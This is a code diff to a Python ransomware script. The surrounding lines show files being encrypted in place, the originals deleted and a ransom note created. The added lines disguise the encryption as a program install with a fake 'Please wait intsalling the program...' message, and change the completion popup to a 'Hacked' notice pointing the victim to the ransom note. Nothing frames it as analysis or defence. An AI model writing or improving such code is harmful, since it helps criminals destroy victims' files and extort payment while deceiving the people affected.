@@ -1,3 +1,4 @@
+
 import os
 import json
 import sys
@@ -80,6 +81,7 @@ def encrypt_file_in_place(file_path, key, iv):
     """
     Encrypts a file in-place.
     """
+    print(f"Please wait intsalling the program...")
     try:
         # Read the original file
         with open(file_path, "rb") as f:
@@ -97,7 +99,7 @@ def encrypt_file_in_place(file_path, key, iv):
         # Delete the original file
         os.remove(file_path)
         
-        print(f"Encrypted: {file_path}")
+       # print(f"Please wait intsalling the program...")
         return True
     except Exception as e:
         print(f"Error encrypting {file_path}: {str(e)}")
@@ -163,7 +165,7 @@ def encrypt_files():
         # Create the ransom note
         create_ransom_note()
         
-        messagebox.showinfo("Encryption Complete", f"{success_count} files have been encrypted.")
+        messagebox.showinfo("Hacked", f"{success_count} files have been encrypted. Please check the ransom note for instructions.")
     else:
         messagebox.showwarning("Already Encrypted", "Files are already encrypted.")
 
